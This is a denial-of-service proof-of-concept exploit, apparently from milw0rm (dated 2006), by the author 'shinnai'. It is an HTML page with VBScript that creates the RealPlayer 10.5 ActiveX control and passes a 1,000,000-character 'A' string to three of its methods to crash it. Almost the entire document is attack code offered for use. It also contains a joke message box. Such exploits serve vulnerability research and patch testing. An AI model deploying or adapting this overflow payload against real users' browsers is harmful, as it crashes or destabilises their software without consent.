@@ -1,0 +1,50 @@
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">-----------------------------------------------------------------------------
+ RealPlayer 10.5 ierpplug.dll multiple methods Denial of Service
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+-----------------------------------------------------------------------------
+
+
+<object classid='clsid:FDC7A535-4070-4B92-A0EA-D9994BCC0DC5' id='RealPlayer'></object>
+<select style="width: 404px" name="Pucca">
+  <option value = "GetComponentVersion">GetComponentVersion</option>
+  <option value = "HandleAction">HandleAction</option>
+  <option value = "DoAutoUpdateRequest">DoAutoUpdateRequest</option>
+  <option value = "Quoting">Quoting...</option>
+</select>
+
+
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language='vbscript'>
+ Sub tryMe
+  on error resume next
+   if Pucca.value="GetComponentVersion" then
+     argCount   = 1
+     arg1=String(1000000, "A")
+     RealPlayer.GetComponentVersion arg1
+   elseif Pucca.value="HandleAction" then
+     argCount   = 1
+     arg1=String(1000000, "A")
+     RealPlayer.HandleAction arg1
+   elseif Pucca.value = "DoAutoUpdateRequest" then
+     argCount = 3
+     arg1=1
+     arg2=String(1000000, "A")
+     arg3=1
+     RealPlayer.DoAutoUpdateRequest arg1 ,arg2 ,arg3
+   else
+     MsgBox "And the beast shall come forth surrounded by a roiling cloud of vengeance." & vbCrLf & _
+     "The house of the unbelievers shall be razed and they shall be scorched to the earth." & vbCrLf &_
+     "Their tags shall blink until the end of days."
+   end if
+ End Sub
+</script>
+</span></span>
+</code></pre>
+
+# milw0rm.com [2006-12-28]
